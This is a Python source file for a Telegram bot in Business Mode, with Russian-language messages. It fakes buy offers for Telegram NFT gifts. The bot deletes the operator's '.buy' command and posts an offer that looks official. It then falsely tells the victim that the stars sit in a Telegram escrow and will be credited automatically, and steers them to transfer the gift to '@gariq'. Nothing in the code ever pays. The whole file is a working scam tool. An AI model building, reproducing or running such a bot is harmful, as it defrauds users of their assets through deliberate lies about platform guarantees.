import asyncio
import logging
import os
import re
import uuid
from datetime import datetime, timedelta

from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# --- ЗАГРУЗКА ПЕРЕМЕННЫХ ИЗ .env ---
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=gariq")
RECIPIENT_USERNAME = os.getenv("RECIPIENT_USERNAME", "@gariq")
STAR_EMOJI_ID = os.getenv("STAR_EMOJI_ID", "5920433463428650761")
CHECK_EMOJI_ID = os.getenv("CHECK_EMOJI_ID", "5776375003280838798")
CROSS_EMOJI_ID = os.getenv("CROSS_EMOJI_ID", "5778527486270770928")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN не найден в .env файле!")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

offers = {}


# --- УТИЛИТЫ ПРЕМИУМ-ЭМОДЗИ (для текста сообщений) ---
def star_emoji() -> str:
    return f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'


def check_emoji() -> str:
    return f'<tg-emoji emoji-id="{CHECK_EMOJI_ID}">✔️</tg-emoji>'


def cross_emoji() -> str:
    return f'<tg-emoji emoji-id="{CROSS_EMOJI_ID}">❌</tg-emoji>'


def pretty_nft_name(nft_url: str) -> str:
    raw = nft_url.rstrip("/").split("/")[-1]
    if "-" in raw:
        name_part, num_part = raw.rsplit("-", 1)
        name_part = re.sub(r'(?<!^)(?=[A-Z])', ' ', name_part)
        return f"{name_part} #{num_part}"
    return raw


# --- КЛАВИАТУРЫ ---
def get_offer_keyboard(order_id: str) -> InlineKeyboardMarkup:
    """
    1-е меню: премиум-эмодзи БЕЗ цветных стилей.
    """
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="Принять",
                callback_data=f"accept_{order_id}",
                icon_custom_emoji_id=CHECK_EMOJI_ID
            ),
            InlineKeyboardButton(
                text="Отклонить",
                callback_data=f"decline_{order_id}",
                icon_custom_emoji_id=CROSS_EMOJI_ID
            ),
        ]
    ])


def get_deal_keyboard(order_id: str) -> InlineKeyboardMarkup:
    """
    2-е меню: кнопка «Передать подарок» БЕЗ иконки,
    «Подтвердить передачу» — с галочкой.
    """
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="Передать подарок",
                url=NFT_TRANSFER_LINK
            )
        ],
        [
            InlineKeyboardButton(
                text="Подтвердить передачу",
                callback_data=f"confirm_{order_id}",
                icon_custom_emoji_id=CHECK_EMOJI_ID
            )
        ]
    ])


def get_final_transfer_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="Подтвердить передачу",
                url=NFT_TRANSFER_LINK,
                icon_custom_emoji_id=CHECK_EMOJI_ID
            )
        ]
    ])


# --- КОМАНДА .buy ---
@dp.business_message(F.text.startswith(".buy"))
async def cmd_buy_business(message: types.Message):
    args = message.text.split()

    if len(args) < 3:
        await message.answer(
            "Формат: `.buy <ссылка> <звёзд> [валюта] [язык]`\n"
            "Пример: `.buy https://t.me/nft/RestlessJar-35843 1 stars ru`"
        )
        try:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
        except Exception as e:
            print(f"[DELETE ERROR] {e}")
        return

    nft_url = args[1]
    stars_amount = args[2]
    nft_name = pretty_nft_name(nft_url)

    order_id = f"TG-{str(uuid.uuid4())[:10].upper()}"
    expires_at = datetime.now() + timedelta(hours=6)

    offers[order_id] = {
        "nft_url": nft_url,
        "nft_name": nft_name,
        "stars": stars_amount,
        "expires_at": expires_at,
        "status": "pending",
        "business_connection_id": message.business_connection_id,
        "chat_id": message.chat.id,
    }

    text = (
        f"<b>Пользователь предлагает Вам</b>\n\n"
        f"{stars_amount} {star_emoji()} за подарок "
        f"<a href=\"{nft_url}\">{nft_name}</a>.\n\n"
        f"Предложение действует ещё <b>6 ч. 0 мин.</b>"
    )

    await message.answer(
        text=text,
        reply_markup=get_offer_keyboard(order_id),
        disable_web_page_preview=True,
        parse_mode="HTML"
    )

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        print(f"[DELETE ERROR] {e}")


# --- ПРИНЯТЬ ---
@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    if not offer or offer["status"] != "pending":
        await callback.answer("Оффер уже недействителен.", show_alert=True)
        return

    offer["status"] = "accepted"

    text = (
        f"<b>Сделка с NFT</b>\n\n"
        f"Заказ #{order_id}\n\n"
        f"Покупатель зарезервировал <b>{offer['stars']} {star_emoji()}</b> "
        f"через гарантийную систему Telegram. "
        f"Звёзды находятся на специальном счёте удержания и будут автоматически начислены "
        f"на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте пользователю: {RECIPIENT_USERNAME}\n"
        f"2. Нажмите «Передать подарок» и выберите "
        f"<a href=\"{offer['nft_url']}\">{offer['nft_name']}</a>\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Система Telegram зафиксирует транзакцию и моментально зачислит "
        f"{offer['stars']} {star_emoji()} на ваш баланс. Резерв действует 24 часа."
    )

    await callback.message.edit_text(
        text=text,
        reply_markup=get_deal_keyboard(order_id),
        disable_web_page_preview=True,
        parse_mode="HTML"
    )
    await callback.answer("Оффер принят")


# --- ОТКЛОНИТЬ ---
@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    if not offer or offer["status"] != "pending":
        await callback.answer("Оффер уже недействителен.", show_alert=True)
        return

    offer["status"] = "declined"

    await callback.message.edit_text(
        text=(
            f"<b>Заказ #{order_id}</b>\n\n"
            f"{cross_emoji()} Вы отклонили предложение."
        ),
        parse_mode="HTML"
    )
    await callback.answer("Отклонено")


# --- ПОДТВЕРДИТЬ ---
@dp.callback_query(F.data.startswith("confirm_"))
async def process_confirm(callback: CallbackQuery):
    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    if not offer:
        await callback.answer("Заказ не найден.", show_alert=True)
        return

    await callback.message.edit_text(
        text=(
            f"<b>Заказ #{order_id}</b>\n\n"
            f"Пожалуйста, завершите передачу NFT, нажав на кнопку ниже.\n\n"
            f"После передачи подарка звёзды будут зачислены автоматически."
        ),
        reply_markup=get_final_transfer_keyboard(),
        parse_mode="HTML"
    )
    await callback.answer("Ссылка на передачу обновлена!")


# --- DEBUG ---
@dp.business_message()
async def debug_business(message: types.Message):
    print(f"[BUSINESS DEBUG] {message.text!r} | conn_id={message.business_connection_id}")


async def main():
    print("Бот запущен (Business Mode)...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())